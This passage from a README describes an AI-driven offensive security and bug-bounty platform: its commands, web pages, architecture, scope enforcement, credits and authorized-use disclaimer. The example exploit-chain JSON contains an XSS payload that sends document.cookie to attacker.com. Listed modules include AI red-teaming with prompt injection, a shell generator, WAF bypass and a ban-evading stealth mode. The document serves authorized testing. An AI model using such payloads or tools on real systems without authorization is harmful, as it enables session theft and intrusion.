| `full-scan` | Complete 7-phase pipeline: recon → vuln → exploit → report |
| `god-mode` | Every capability, zero skip — the full adaptive cascade |
| `scope` | Show current program scope |
| `debug` | System integrity check and common issue fixer |
| `toolcheck` | Show which security tools are installed |
| `doctor --deep` | Deeper QA scenario coverage |
| `doctor --json` | Machine-readable health output |

### Recon

| Command | Description |
|---|---|
| `recon` | Full recon pipeline: subdomains → HTTP probe → crawl → content |
| `org-intel` | Map GitHub org to likely domains (metadata-based) |
| `adaptive-recon` | Tech-stack-aware recon with dynamic module selection |
| `secrets-scan` | Intelligent GitHub Secret Intelligence Agent (9-phase) |
| `secrets` | Secrets discovery: trufflehog + gitleaks |

### Scanning

| Command | Description |
|---|---|
| `vuln-scan` | Vulnerability scan: nuclei + dalfox + sqlmap + more |
| `fuzz` | Directory/content fuzzing: ffuf + gobuster + dirsearch |
| `graphql-scan` | GraphQL schema extraction + BOLA/auth testing |
| `browser-scan` | Headless browser-driven crawl + attack surface scan |
| `smuggling-scan` | HTTP request smuggling (CL-TE, TE-CL, TE-TE) |
| `parity-check` | Compare tool outputs for coverage gaps |
| `swarm-scan` | Full swarm intelligence scan with all 8 agents |

### Attack & Exploit

| Command | Description |
|---|---|
| `chains` | Detect exploit chains from confirmed findings |
| `exploit` | Detect chains + generate PoC |
| `zero-day` | Theory generation → custom tests → zero-day detection |
| `analyze-app` | Build application model for research mode |
| `generate-theories` | AI-driven vulnerability theory generation |
| `run-custom-tests` | Execute custom test suite from theories |
| `simulate-attacks` | Monte Carlo attack simulation with path scoring |
| `simulate-workflow` | Full workflow simulation with cookie/token auth |

### Attack Graph & Brain

| Command | Description |
|---|---|
| `attack-graph` | Build and analyze attack graph |
| `graph verify` | Compare in-memory vs Neo4j node/edge counts |
| `graph stats` | Show graph metrics |
| `graph neo4j-status` | Neo4j connectivity and last sync time |
| `brain-start` | Start always-on AI graph brain daemon |
| `brain-stop` | Stop the brain daemon |
| `brain-status` | Show brain daemon status |
| `brain-decide` | Trigger AI decision for a target |
| `brain-triggers` | Show all active graph triggers |

### Agents

| Command | Description |
|---|---|
| `agents run` | Launch full autonomous pentest |
| `agents status` | Show status of running agents |

### Research

| Command | Description |
|---|---|
| `research` | Build app model → generate theories → execute tests |
| `workflow` | Guided autonomous workflow orchestration |

### AI Security

| Command | Description |
|---|---|
| `ai-test` | Full AI model security scan |
| `ai-redteam` | Red team campaign with genetic prompt evolution |
| `ai-agent-test` | Agentic system testing (tool abuse, prompt injection) |

### Mobile

| Command | Description |
|---|---|
| `mobile-analyze` | Full 12-phase mobile security analysis (APK/IPA) |
| `mobile-static` | Static analysis only |
| `mobile-dynamic` | Dynamic analysis (requires connected device) |
| `mobile-api-scan` | Discover and fuzz mobile API endpoints |
| `mobile-report` | Generate mobile security report |

### Traffic & Proxy

| Command | Description |
|---|---|
| `traffic-list` | List captured HTTP traffic |
| `traffic-export` | Export captured traffic (burp/json/har) |
| `replay` | Convert findings.json into reproducible CLI workflows |
| `replay-request` | Replay a captured HTTP request |
| `replay-attack` | Replay a discovered attack with payload |
| `proxy-status` | Show current proxy configuration |
| `proxy-set` | Configure proxy for current session |

### Bug Bounty Hunter

| Command | Description |
|---|---|
| `hunter-start` | Start autonomous multi-target bug bounty hunter |
| `hunter-scan` | Scan a specific target through autonomous pipeline |
| `hunter-status` | Show active/recent hunter session status |
| `hunter-report` | Generate report from a hunter session |
| `hunter` | Combined hunter entry point |

### Learning & Profiles

| Command | Description |
|---|---|
| `learn stats` | Show learning statistics |
| `learn plan` | Show adaptive scan plan for a domain |
| `learn backfill` | Backfill Neo4j learning graph from PG findings |
| `profile list` | List all scan profiles |
| `profile show` | Show profile details |
| `profile run` | Run a full scan with a named profile |

### Findings & Reporting

| Command | Description |
|---|---|
| `findings list` | Browse findings (filter by severity) |
| `findings show` | Show a specific finding |
| `findings stats` | Show findings statistics |
| `findings export` | Export: json / csv / markdown / html |
| `report` | Generate bug bounty report (H1/Bugcrowd/Intigriti) |
| `cvss` | CVSS 3.1 calculator |
| `dedup` | Check if finding is likely a duplicate |

### Payloads & Utilities

| Command | Description |
|---|---|
| `payloads` | Context-aware payload library |
| `waf-bypass` | WAF-specific bypass payloads |
| `methodology` | Step-by-step testing methodology |
| `script` | Generate test scripts |
| `plan` | Generate prioritized hunt plan |
| `analyze` | Analyze recon data files |

### Infrastructure

| Command | Description |
|---|---|
| `plugins list` | List registered plugins |
| `plugins run` | Run a specific plugin |
| `cache stats` | Show cache statistics |
| `cache sweep` | Remove expired cache entries |
| `cache invalidate` | Invalidate cache for a target |
| `cache clear` | Clear all cached data |

### AI Model Orchestration

| Command | Description |
|---|---|
| `ai` | Execute a task via the AI model orchestrator |
| `ai-status` | Show model orchestrator status |
| `ai-budget` | Show AI cost budget and usage |
| `ai-models` | List configured AI models with tiers and cost |

### System Evolution

| Command | Description |
|---|---|
| `arch-status` | Show self-evolving architecture status |
| `arch-events` | Show recent architecture events |
| `arch-insights` | Show AI-generated architecture insights |
| `arch-emit` | Emit a custom architecture event |

### Daemon

| Command | Description |
|---|---|
| `daemon-start` | Start always-on background daemon |
| `daemon-stop` | Stop the daemon |
| `daemon-status` | Show daemon status |
| `daemon-add-target` | Add target to running daemon without restart |

### Benchmarking & Distributed

| Command | Description |
|---|---|
| `benchmark` | Run performance benchmark suite |
| `distributed` | Manage distributed worker cluster |
| `capmap` | Show capability map for all modules |

---

## 🖥️ Web UI (43 Pages)

Start the web UI: `cd web/frontend && npm run dev` → `http://localhost:3000`

| Page | Description |
|---|---|
| `Dashboard` | System-wide overview: active scans, recent findings, agent status |
| `UnifiedScan` | Start and monitor full-stack scans |
| `Results` | Browse, filter, and export findings |
| `AttackGraph` | Interactive attack graph visualization (ForceGraph2D) |
| `AttackChains` | Exploit chain viewer with step-by-step PoC |
| `ExploitChainViewer` | Detailed chain timeline with evidence |
| `BrainDashboard` | AI decision engine status and next-action queue |
| `SwarmIntelligence` | 8-agent swarm status with per-agent EMA metrics |
| `Research` | Zero-day research mode: theories, app model, custom tests |
| `AdaptivePlanning` | Learning system: EMA charts, adaptive scan plan |
| `Learning` | Knowledge base browser: patterns, payloads, target insights |
| `AIModels` | Model orchestrator: tiers, budget, cost per provider |
| `AIRedTeam` | AI red team campaigns with live evolution display |
| `MobileAgent` | Android/iOS device management, VPN capture control |
| `MobileSecurity` | APK/IPA analysis results and report viewer |
| `MobileWorkspace` | Full mobile workspace: frida scripts, ADB, traffic |
| `Web3Center` | Smart contract scanner and Foundry PoC viewer |
| `Arsenal` | Nim payload arsenal: shell-gen, bypass-gen, post-exploit |
| `TrafficExplorer` | Live traffic capture, filter, replay, diff |
| `SecretDashboard` | Secret intelligence findings with live validation status |
| `BountyHunter` | Autonomous hunter session management |
| `Reports` | Report generator: H1/Bugcrowd/Intigriti output |
| `ReportPreview` | Live report preview with CVSS and bounty estimate |
| `OrchestratorPanel` | Scan orchestrator control panel |
| `GodMode` | God Mode launcher and live stage progress |
| `IDORCenter` | IDOR test center with multi-account session matrix |
| `QueueMonitor` | Redis worker queue depths and task status |
| `SystemHealth` | Tool health, service status, DB mode |
| `SystemControl` | Platform controls: workers, services, shutdown |
| `SystemEvolution` | Self-evolving architecture event stream |
| `Infrastructure` | Docker service management, scaling controls |
| `Simulation` | Monte Carlo attack simulation results |
| `LiveIntelligence` | Live SSE stream: findings as they are discovered |
| `Fuzzer` | Fuzzing campaign management (ffuf/gobuster/dirsearch) |
| `PayloadLibrary` | Context-aware payload browser with copy/export |
| `ToolAnalytics` | Per-tool effectiveness metrics and yield charts |
| `Tools` | Tool registry: install status, versions, config |
| `Settings` | Platform settings: scope, API keys, AI provider config |
| `Targets` | Target inventory with priority scores |
| `MCPControl` | HackerOne MCP tool interface |
| `CICDCenter` | CI/CD vulnerability scan results |
| `Utilities` | CVSS calculator, dedup checker, methodology viewer |

---

## 🏗️ Architecture

```
┌──────────────────────────────────────────────────────────────────────┐
│                          INPUT LAYER                                 │
│  CLI (75+ cmds)  ·  Web UI (43 pages, React)  ·  API (54+ routes)  │
└──────────────────────────┬───────────────────────────────────────────┘
                           │
┌──────────────────────────▼───────────────────────────────────────────┐
│                        RECON LAYER                                   │
│  subfinder · amass · httpx · katana · waybackurls · naabu · dnsx   │
│  OpenAPI crawler · Adaptive recon · OSINT · ASN · Cert-transparency │
└──────────────────────────┬───────────────────────────────────────────┘
                           │ findings → recon assets
┌──────────────────────────▼───────────────────────────────────────────┐
│                     ATTACK GRAPH ENGINE                              │
│  Nodes (subdomains, endpoints, parameters, credentials, services)   │
│  Edges (resolves-to, hosts, param-of, used-by)                      │
│  15 trigger rules · BFS path finder · Risk scorer                  │
│  PathSimulator · Neo4j backend · ForceGraph2D visualization         │
└──────────────────────────┬───────────────────────────────────────────┘
                           │ prioritized node queue
┌──────────────────────────▼───────────────────────────────────────────┐
│                    AI DECISION ENGINE                                │
│  AutonomousDecisionEngine · GraphTriggerEngine                       │
│  Scoring: impact × exploitability × novelty / effort × penalty     │
│  Agent outcome feedback loop (EMA per agent)                        │
└──────────────────────────┬───────────────────────────────────────────┘
                           │ AI task requests
┌──────────────────────────▼───────────────────────────────────────────┐
│              AI MODEL ORCHESTRATION                                  │
│  ModelOrchestrator · 3-tier routing (FAST → STANDARD → PREMIUM)    │
│  Providers: OpenAI · Anthropic · Google Gemini · Ollama (local)    │
│  CLI fallbacks: Codex CLI · Claude Code CLI                         │
│  Budget guard · cost-aware routing · models.yaml config             │
└──────────────────────────┬───────────────────────────────────────────┘
                           │ (node, agent) dispatch pairs
┌──────────────────────────▼───────────────────────────────────────────┐
│                     AGENT SWARM (8 agents)                          │
│  XSS · SQLi · SSRF · IDOR · Auth · BizLogic · API · Mobile         │
│  Each agent: hypothesis gen → tool execution → result ingest        │
│  Cross-agent collaboration rules (SQLi→IDOR, SSRF→IDOR, XSS→Auth)  │
└──────────────────────────┬───────────────────────────────────────────┘
                           │ raw findings
┌──────────────────────────▼───────────────────────────────────────────┐
│              RESULT INGESTION ENGINE (singleton)                    │
│  Normalize → SHA-256 dedup → atomic check-and-store (WAL SQLite/PG) │
│  Broadcast to: attack graph · exploit chain engine · web UI (SSE)  │
└──────────┬────────────────────────┬──────────────────────────────────┘
           │                        │
┌──────────▼──────────┐  ┌──────────▼──────────────────────────────────┐
│  VALIDATION ENGINE  │  │     EXPLOIT CHAIN ENGINE                    │
│  Per-type active    │  │  6 patterns (SSRF→Cloud, XSS→ATO,           │
│  re-testing         │  │  SQLi→RCE, IDOR→PrivEsc,                    │
│  CVSS gating        │  │  CORS→CredTheft, Redirect→OAuth)            │
│  FP quarantine      │  │  Step-best-match PoC generation             │
└──────────┬──────────┘  └──────────┬──────────────────────────────────┘
           │                        │
┌──────────▼────────────────────────▼──────────────────────────────────┐
│                        OUTPUT LAYER                                  │
│  Findings DB (SQLite WAL / PostgreSQL)  · JSON / Markdown / PDF     │
│  H1 / Bugcrowd / Intigriti reports  ·  CVSS 3.1  ·  Bounty ROI    │
└──────────────────────────┬───────────────────────────────────────────┘
                           │
┌──────────────────────────▼───────────────────────────────────────────┐
│                     LEARNING LAYER                                   │
│  KnowledgeBase · AdaptivePlanner · PatternMiner · RealTimeLearner  │
│  EMA success rates · CapabilitySnapshot · MemoryManager            │
│  Auto-updates ARCHITECTURE.md / SKILLS.md on FEATURE_ADDED events  │
└──────────────────────────────────────────────────────────────────────┘
```

**AI Model Orchestration** (3-tier routing):

| Tier | Models | Use Cases |
|---|---|---|
| FAST | Gemini Flash, Ollama small | Quick triage, simple decisions |
| STANDARD | GPT-4o, Claude Sonnet, Gemini Pro, Ollama mid | Standard analysis, report drafting |
| PREMIUM | GPT-4, Claude Opus, Gemini Ultra | Zero-day theory, complex exploit chains |

Ollama models are **auto-discovered** from the running daemon at startup — tier assigned by parameter count (≥70B → PREMIUM, 27–34B → STANDARD, else FAST). CLI fallbacks (`codex exec`, `claude -p`) activate on API auth errors or budget exhaustion.

---

## 📂 Project Structure

```
oneinfinity/
│
├── run.py                          # Development shim → src/oneinfinity/cli/main.py
├── pyproject.toml                  # Single dependency source (extras: ai, mobile, web, distributed)
├── install.sh                      # One-click cross-platform installer
├── Makefile                        # 30 Docker convenience targets
├── Dockerfile / Dockerfile.worker  # Multi-stage images
├── docker-compose*.yml             # Single-host and distributed (15-service) stacks
├── checksums.json                  # SHA-256 hashes for Nim binaries
│
├── config/
│   ├── models.yaml                 # AI model registry (tiers, costs, routing, Ollama, CLI fallbacks)
│   ├── agents.yaml                 # Agent capability and concurrency config
│   ├── graph.yaml                  # Attack graph + Neo4j settings
│   └── neo4j.yaml                  # Neo4j connection config
│
├── src/oneinfinity/                # Main Python package
│   ├── cli/                        # CLI router + 17 command modules
│   ├── orchestration/              # ModelOrchestrator, 3-tier routing, backends (Ollama, CLI)
│   ├── recon/                      # Recon & OSINT engines, adaptive recon, OpenAPI crawler
│   ├── scan/                       # 80+ vulnerability scanning engines
│   ├── attack/                     # Exploit generation, PoC generator, zero-day engine
│   ├── attack_graph_core/          # Graph engine, Neo4j backend, risk analyzer, visualizer
│   ├── swarm/                      # 8-agent swarm + coordinator + execution fabric
│   ├── intelligence/               # Decision engine, graph triggers, daemon
│   ├── findings/                   # Finding ingestion, dedup, validation
│   ├── exploit_chains/             # 6 chain patterns + PoC generator + graph chain detector
│   ├── bounty/                     # Bug bounty hunter, report generator, platform API
│   ├── ai_security/                # AI red-team, prompt injection, framework wrappers
│   ├── ai/                         # AI agent pentest engine, redteam engine, model extraction
│   ├── mobile/                     # 12-phase mobile pipeline (Android + iOS)
│   ├── web3/                       # Smart contract scanner, EVM/Solana, Foundry PoC
│   ├── arsenal/                    # Nim payload engine wrapper + Python payload chains
│   ├── auth/                       # Session manager, login recorder, multi-account IDOR
│   ├── infra/                      # Model budget, nim_runner, proxy manager, reliable queue
│   ├── learning/                   # AdaptivePlanner, KnowledgeBase, PatternMiner
│   ├── pipeline/                   # 7-phase autonomous scan pipeline
│   ├── agents/                     # Agent base classes + validation orchestrator
│   ├── modules/                    # Tool wrappers, payload lib, CVSS, scope
│   ├── core/                       # DB manager, PG client, dedup, cache, profiles, eBPF tracer
│   ├── framework/                  # OWASP framework orchestrator
│   ├── mcp/                        # HackerOne/Bugcrowd MCP server tools
│   └── plugins/                    # Hot-reloadable recon + vuln plugins
│
├── src/nim/                        # Nim source files + compiled binaries
│   ├── oi-shell-gen.nim            # Polymorphic shell generator
│   ├── oi-bypass-gen.nim           # 403/WAF bypass generator
│   ├── oi-payloads.nim             # Payload library
│   ├── oi-post-exploit.nim         # Post-exploitation templates
│   ├── oi-privesc-gen.nim          # Privilege escalation templates
│   ├── oi-fuzzer.nim               # Fuzzing payload generator
│   └── bin/                        # Compiled binaries (integrity-verified)
│
├── web/
│   ├── backend/                    # FastAPI backend (54+ routes, SSE, WebSocket)
│   └── frontend/                   # React UI (43 pages, Tailwind CSS, Vite)
│
├── android-companion/              # Android VPN-capture companion app (Kotlin)
├── ios-companion/                  # iOS Network Extension companion app (Swift)
├── frida_scripts/                  # Pre-built Frida scripts (SSL bypass, root bypass, etc.)
├── tests/                          # 130+ test files
├── scripts/                        # Setup scripts (postgres, redis, neo4j, workers)
├── services/                       # Redis, nginx, Prometheus, Grafana configs
├── db/                             # PostgreSQL schema (schema.sql)
├── missions/                       # Autonomous overnight mission scripts
└── docs/
    ├── ARCHITECTURE.md
    ├── DOCUMENTATION.md
    ├── CHANGELOG.md
    ├── CONTRIBUTING.md
    ├── DOCKER.md
    ├── ADVANCED_SECURITY_MODULES.md
    └── SECURITY.md
```

---

## 📊 Output Examples

### Finding (JSON)

```json
{
  "id": "f3a9c2d1",
  "vuln_type": "xss",
  "severity": "high",
  "cvss": 8.1,
  "url": "https://example.com/search",
  "parameter": "q",
  "payload": "<img src=x onerror=alert(document.cookie)>",
  "validated": true,
  "validation_method": "canary_reflection",
  "tool": "dalfox",
  "scan_id": "scan_20260629_001",
  "created_at": "2026-06-29T14:22:01Z",
  "chain_eligible": true,
  "chain_pattern": "xss_to_ato",
  "reproduction": "oneinfinity vuln-scan --target https://example.com/search --xss --payload \"...\""
}
```

### Exploit Chain (JSON)

```json
{
  "chain_id": "chain_xss_ato_001",
  "pattern": "xss_to_ato",
  "severity": "critical",
  "steps": [
    {
      "step": "xss",
      "url": "https://example.com/search?q=<payload>",
      "payload": "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
      "result": "session cookie exfiltrated"
    },
    {
      "step": "session_hijack",
      "url": "https://example.com/account",
      "method": "Cookie header injection with stolen token",
      "result": "full account access"
    }
  ],
  "bounty_estimate": "$2,000 – $5,000",
  "report_format": "hackerone"
}
```

### Doctor Output

```
Health Score: 🟢 10.0 / 10.0 (Healthy)
  ✅ Working: 99
  ⚠️  Partial: 0
  ❌ Broken:  0

QA Scenarios:  34 pass / 0 fail
Regressions:   None detected
Tools checked: 34 installed / 6 optional missing
```

---

## 🔐 Security & Safety

### Scope Enforcement

Every tool wrapper validates the target against the configured scope before execution. Scope is defined in `scope.yaml` and supports:
- Exact domains and subdomains
- Wildcard rules (`*.example.com`)
- CIDR ranges (`10.0.0.0/8`)
- Always-out-of-scope list (permanently blocked domains/IPs)

Every scope decision is written to an audit log. No request is sent to an out-of-scope target — the check runs before the tool subprocess starts.

### Rate Limiting

Built-in per-domain rate limiting. GitHub API requests use a token rotation pool with EMA quota tracking. All HTTP clients use configurable timeouts and retry budgets.

### Data Safety

- Secret raw values are stripped after scoring and **never** persisted to the findings database
- Live secret validation uses read-only API calls (no write, no delete, 3-second timeout)
- Hardcoded credentials are explicitly rejected in all configuration paths

### Nim Binary Integrity

All Nim binaries are verified against SHA-256 checksums in `checksums.json` before execution. Path traversal is blocked at the allowlist level — only the 6 known binary names are accepted.

### Safe Execution Profiles

| Profile | Noise Level | Use Case |
|---|---|---|
| `stealth` | Minimal | Rate-limited, low-frequency, ban-evading |
| `quick` | Low | Fast surface-level check |
| `deep` | High | Full tool suite, longer timeouts |
| `research` | High | Theory generation + custom tests |
| `swarm` | Very high | Multi-target parallel; use with care |

---

## 🐳 Docker Quick Reference

| Task | Command |
|---|---|
| First-time setup | `make setup` |
| Build images | `make build` |
| Start full stack | `make up` |
| Start minimal (no monitoring) | `make up-min` |
| Submit full scan | `make scan T=example.com` |
| Recon only | `make recon T=example.com` |
| Scale recon workers | `make scale-recon N=4` |
| Check worker health | `make workers-status` |
| View queue depths | `make queue-status` |
| Tail all logs | `make logs` |
| Open orchestrator shell | `make shell` |
| Stop everything | `make down` |
| Remove all scan data | `make purge` |

Image variants: `latest` (core), `latest-ai` (with AI/ML dependencies).

Full reference: [docs/DOCKER.md](docs/DOCKER.md)

---

## 📈 Roadmap

- [ ] **Nuclei template auto-generation** — generate custom Nuclei templates from zero-day findings
- [ ] **CI/CD integration** — native GitHub Actions / GitLab CI pipeline templates with finding gating
- [ ] **iOS static analysis** — IPA decompilation and full Frida-based iOS dynamic analysis parity
- [ ] **Nuclei v3 custom flow support** — conditional multi-step template execution
- [ ] **Passive traffic integration** — mitmproxy plugin for always-on passive scanning during manual testing
- [ ] **GraphQL introspection attack engine** — automated schema extraction + BOLA/auth testing (full)
- [x] **LLM-driven triage** — Ollama local LLM backend with auto-discovery and CLI fallbacks (v1.3.0)
- [x] **Distributed agent cluster** — Redis-backed master-worker swarm (v1.2.0)
- [x] **Web3 / Smart contract security** — EVM + Solana scanner, Foundry PoC (v2.0.0)
- [x] **Nim payload arsenal** — 6 native offensive binaries with integrity verification (v2.0.0)
- [x] **Authenticated testing suite** — login recorder, session replay, multi-account IDOR (v2.0.0)
- [x] **iOS companion app** — Network Extension + Frida integration (v2.0.0)
- [x] **MCP integration** — HackerOne/Bugcrowd MCP tools for Claude Code / Gemini CLI (v2.0.0)

---

## 🙏 Credits & Acknowledgements

One&Infinity is built on top of an ecosystem of world-class open-source security tools. We integrate but do not claim ownership of any of the following:

### Reconnaissance & Scanning

| Tool | Author / Organization | License |
|---|---|---|
| [Nuclei](https://github.com/projectdiscovery/nuclei) | ProjectDiscovery | MIT |
| [Subfinder](https://github.com/projectdiscovery/subfinder) | ProjectDiscovery | MIT |
| [Httpx](https://github.com/projectdiscovery/httpx) | ProjectDiscovery | MIT |
| [Dnsx](https://github.com/projectdiscovery/dnsx) | ProjectDiscovery | MIT |
| [Naabu](https://github.com/projectdiscovery/naabu) | ProjectDiscovery | MIT |
| [Katana](https://github.com/projectdiscovery/katana) | ProjectDiscovery | MIT |
| [Amass](https://github.com/owasp-amass/amass) | OWASP | Apache 2.0 |
| [Assetfinder](https://github.com/tomnomnom/assetfinder) | Tom Hudson | MIT |
| [Findomain](https://github.com/findomain/findomain) | Edu4rdSHL | GPL-3.0 |
| [Waybackurls](https://github.com/tomnomnom/waybackurls) | Tom Hudson | MIT |
| [Gauplus](https://github.com/bp0lr/gauplus) | bp0lr | MIT |
| [Hakrawler](https://github.com/hakluke/hakrawler) | hakluke | MIT |

### Vulnerability Testing

| Tool | Author / Organization | License |
|---|---|---|
| [Dalfox](https://github.com/hahwul/dalfox) | hahwul | MIT |
| [Kxss](https://github.com/Emoe/kxss) | Emoe | — |
| [XSStrike](https://github.com/s0md3v/XSStrike) | s0md3v | GPL-3.0 |
| [SQLMap](https://github.com/sqlmapproject/sqlmap) | sqlmapproject | GPL-2.0 |
| [Commix](https://github.com/commixproject/commix) | commixproject | GPL-3.0 |
| [CRLFuzz](https://github.com/dwisiswant0/crlfuzz) | dwisiswant0 | MIT |
| [FFuf](https://github.com/ffuf/ffuf) | joohoi | MIT |
| [Gobuster](https://github.com/OJ/gobuster) | OJ Reeves | Apache 2.0 |
| [Dirsearch](https://github.com/maurosoria/dirsearch) | maurosoria | GPL-2.0 |
| [Arjun](https://github.com/s0md3v/Arjun) | s0md3v | GPL-3.0 |
| [GF](https://github.com/tomnomnom/gf) | Tom Hudson | MIT |
| [JWT Tool](https://github.com/ticarpi/jwt_tool) | ticarpi | GPL-3.0 |
| [Nikto](https://github.com/sullo/nikto) | sullo | GPL-2.0 |

### Secret Detection

| Tool | Author / Organization | License |
|---|---|---|
| [TruffleHog](https://github.com/trufflesecurity/trufflehog) | TruffleHog | AGPL-3.0 |
| [Gitleaks](https://github.com/gitleaks/gitleaks) | zricethezav | MIT |

### Mobile Security

| Tool | Author / Organization | License |
|---|---|---|
| [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) | MobSF Project | GPL-3.0 |
| [APKTool](https://github.com/iBotPeaches/Apktool) | iBotPeaches | Apache 2.0 |
| [JADX](https://github.com/skylot/jadx) | skylot | Apache 2.0 |
| [Frida](https://frida.re) | Ole André V. Ravnås | wxWindows |
| [Objection](https://github.com/sensepost/objection) | SensePost | Apache 2.0 |
| [Drozer](https://github.com/WithSecureLabs/drozer) | WithSecure | BSD |

### AI Security

| Tool | Author / Organization | License |
|---|---|---|
| [Garak](https://github.com/NVIDIA/garak) | NVIDIA | Apache 2.0 |
| [PyRIT](https://github.com/Azure/PyRIT) | Microsoft | MIT |
| [Giskard](https://github.com/Giskard-AI/giskard) | Giskard AI | Apache 2.0 |
| [ART](https://github.com/Trusted-AI/adversarial-robustness-toolbox) | IBM Trusted AI | MIT |

### Web3

| Tool | Author / Organization | License |
|---|---|---|
| [Slither](https://github.com/crytic/slither) | Trail of Bits | AGPL-3.0 |
| [Foundry](https://github.com/foundry-rs/foundry) | Paradigm | MIT / Apache 2.0 |

We respect the licenses of every upstream tool. One&Infinity does not bundle tool binaries — it invokes externally installed tools via subprocess or HTTP API. Please review and comply with the license terms of every tool you install.

---

## 🤝 Contributing

Contributions are welcome for:
- New exploit chain patterns (`attack/chain_patterns.py`)
- Additional validation methods (`findings/finding_validation_engine.py`)
- New tool wrappers (`modules/tool_wrappers.py`)
- Plugin contributions (`plugins/recon/` or `plugins/vuln/`)
- New Web3 vulnerability classes (`web3/smart_contract_scanner.py`)
- Nim payload templates (`src/nim/`)

```bash
# Standard flow
git checkout -b feature/your-feature
# Make changes, add tests in tests/
python3 -m unittest discover -s tests -p "test_*.py"
oneinfinity doctor   # must pass at 10.0/10.0
git push origin feature/your-feature
# Open a pull request
```

**Before submitting:** every PR must pass the full test suite (`python3 -m unittest`, 130+ tests) and the doctor health check (`10.0/10.0`).

See [docs/CONTRIBUTING.md](docs/CONTRIBUTING.md) for detailed guidelines.

---

## ⚠️ Disclaimer

**For authorized security testing only.**

One&Infinity is designed for:
- Bug bounty hunting on programs where you have explicit authorization
- Penetration testing engagements with written authorization from the system owner
- Security research on systems you own or have legal permission to test
- Educational and lab environments

**Using this platform against systems without explicit authorization is illegal** under the Computer Fraud and Abuse Act (US), the Computer Misuse Act (UK), and equivalent laws in most jurisdictions. The authors accept no responsibility for unauthorized or malicious use.

Scope enforcement is built in — but it relies on you configuring your scope correctly. Verify your targets before running autonomous modes.

---

## 📬 Contact

Found a bug, have a feature request, or discovered a security issue in One&Infinity itself?

**Email:** [infosec.dev.367@gmail.com](mailto:infosec.dev.367@gmail.com)

For security vulnerabilities in One&Infinity, please disclose responsibly by emailing directly rather than opening a public issue.

---

## 📜 License

MIT License — see [LICENSE](LICENSE) for details.

This license covers only the One&Infinity source code. Integrated tools retain their own licenses. When you install and use external tools, you are bound by their respective licenses.

---

<p align="center">
  <b>One&Infinity doesn't just find vulnerabilities.</b><br>
  <b>It understands why they're reachable, how they chain, and what they're worth.</b>
</p>

<p align="center">
  <i>Built for researchers who think in attack paths, not finding counts.</i>
</p>

<p align="center">
  <a href="https://github.com/Inf1n1tyDeS0ul/oneinfinity/stargazers">⭐ Star this project</a> · 
  <a href="https://github.com/Inf1n1tyDeS0ul/oneinfinity/issues">🐛 Report Issue</a> · 
  <a href="mailto:infosec.dev.367@gmail.com">📬 Contact</a>
</p>
